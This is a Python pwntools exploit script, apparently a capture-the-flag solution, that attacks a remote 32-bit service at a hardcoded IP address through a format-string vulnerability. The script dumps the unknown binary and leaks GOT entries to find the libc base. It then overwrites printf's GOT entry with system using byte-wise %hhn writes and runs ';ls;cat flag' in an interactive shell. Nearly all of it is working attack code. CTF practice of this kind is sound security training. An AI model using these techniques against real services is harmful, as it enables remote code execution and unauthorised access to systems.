#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
# no binary for this challenge
# need to dump the binary first
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    binaryname = 'pwn'
    interruptPoint=[]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')
    
def getinfo(addr):
    io.sendlineafter('me:', '%10$s' + '\x00' * 4 + p32(addr))
    io.recvuntil('Repeater:')
    info = io.recvline()[:-1]
    return info

def dumpfile():
    base = 0x8048f11
    f = open('./dumpfile', 'ab')
    addr =  base
    while(addr < 0x804b000):
        info = getinfo(addr)
        if info == '':
            info = '\x00'
        f.write(info)
        success('{:#x} -> {}'.format(addr, info.encode('hex')))
        addr += len(info)
    f.close()

def getdata(addr):
    io.sendlineafter('me:', '%10$.4s' + '\x00' * 2+ p32(addr))
    io.recvuntil('Repeater:')
    info = io.recvline()[:-1]
    return info

# io = remote('47.108.135.45', 10001)
io = remote('47.108.135.45', 20354)
putsgot = 0x804a01c
readgot = 0x804a010
printgot = 0x804a014
success('read ', u32(getdata(readgot)))
success('puts ', u32(getdata(putsgot)))
success('printf',u32(getdata(printgot)))
libc= ELF('./libc6-i386_2.23-0ubuntu10_amd64.so')

if __name__ == '__main__':
    # dumpfile()
    readaddr = u32(getdata(readgot))
    libcbase = readaddr - libc.sym['read']
    success('libcbase', libcbase)
    libc.address = libcbase
    sys = libc.sym['system']
    binsh = libc.search('/bin/sh').next()
    onegadget = 0x3a819 + libcbase
    success('system', sys)
    success('onegadget', onegadget)

    s1 = sys & 0xff
    s2 = (sys >> 8) & 0xff
    s3 = (sys >> 16) & 0xff
    s4 = (sys >> 24) & 0xff

    payload = ';/bin/sh;'# fmtstr_payload is invalid because of the offset.+ fmtstr_payload(8, {0x804a02c:sys})
    payload += p32(printgot) + p32(printgot+1) + p32(printgot+2) #+p32(printgot+3)
    payload += "%{}c%10$hhn".format(s1 - 30) + "%{}c%11$hhn".format((s2 - s1)%0x100) + "%{}c%12$hhn".format((s3 - s2)%0x100)
    io.sendlineafter('me:', payload)
    io.sendline(';ls;cat flag')

    io.interactive()
    io.close()
